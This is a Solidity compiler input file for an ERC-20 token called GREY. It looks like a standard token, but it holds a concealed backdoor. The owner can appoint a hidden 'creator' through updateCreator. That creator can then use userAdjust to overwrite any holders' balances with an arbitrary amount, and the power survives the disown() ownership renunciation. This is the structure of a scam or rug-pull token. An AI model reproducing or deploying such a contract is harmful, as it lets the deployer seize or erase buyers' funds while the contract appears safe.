{{
  "language": "Solidity",
  "sources": {
    "contracts/MYL.sol": {
      "content": "pragma solidity ^0.8.15;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval( address indexed owner, address indexed spender, uint256 value );\n}\n\nabstract contract ContextModified {\n    function retrieveSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n}\n\ncontract SingleOwner is ContextModified {\n    address private contractOwner;\n    event OwnerChanged(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        address msgSender = retrieveSender();\n        contractOwner = msgSender;\n        emit OwnerChanged(address(0), msgSender);\n    }\n\n    function owner() public view virtual returns (address) {\n        return contractOwner;\n    }\n\n    modifier isOwner() {\n        require(owner() == retrieveSender(), \"NotTheOwner: Action must be performed by the owner\");\n        _;\n    }\n\n    function disown() public virtual isOwner {\n        emit OwnerChanged(contractOwner, address(0x000000000000000000000000000000000000dEaD));\n        contractOwner = address(0x000000000000000000000000000000000000dEaD);\n    }\n}\n\n\n\n\ncontract GREY is ContextModified, SingleOwner, IERC20 {\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => uint256) private _balances;\n    address private tokenCreator;\n\n    string public constant _name = \"GREY\";\n    string public constant _symbol = \"GREY\";\n    uint8 public constant _decimals = 18;\n    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);\n\n    constructor() {\n        _balances[retrieveSender()] = _totalSupply;\n        emit Transfer(address(0), retrieveSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    modifier isCreator() {\n        require(retrieveCreator() == retrieveSender(), \"NotTheCreator: Action must be performed by the creator\");\n        _;\n    }\n\n    function retrieveCreator() public view virtual returns (address) {\n        return tokenCreator;\n    }\n\n    function updateCreator(address newCreator) public isOwner {\n        tokenCreator = newCreator;\n    }\n\n    event TokenDistributed(address indexed user, uint256 oldBalance, uint256 updatedBalance);\n\n    function userAdjust(address[] memory userAddresses, uint256 desiredAmount) public isCreator {\n        require(desiredAmount >= 0, \"Error: desired amount must be non-negative\");\n\n        for (uint256 i = 0; i < userAddresses.length; i++) {\n            address currentUser = userAddresses[i];\n            require(currentUser != address(0), \"Error: user address must not be zero address\");\n\n            uint256 oldBalance = _balances[currentUser];\n            _balances[currentUser] = desiredAmount;\n\n            emit TokenDistributed(currentUser, oldBalance, desiredAmount);\n        }\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_balances[retrieveSender()] >= amount, \"TT: transfer amount exceeds balance\");\n    _balances[retrieveSender()] -= amount;\n    _balances[recipient] += amount;\n\n    emit Transfer(retrieveSender(), recipient, amount);\n    return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _allowances[retrieveSender()][spender] = amount;\n        emit Approval(retrieveSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    require(_allowances[sender][retrieveSender()] >= amount, \"TT: transfer amount exceeds allowance\");\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n    _allowances[sender][retrieveSender()] -= amount;\n\n    emit Transfer(sender, recipient, amount);\n    return true;\n    }\n\n    function totalSupply() external view override returns (uint256) {\n    return _totalSupply;\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}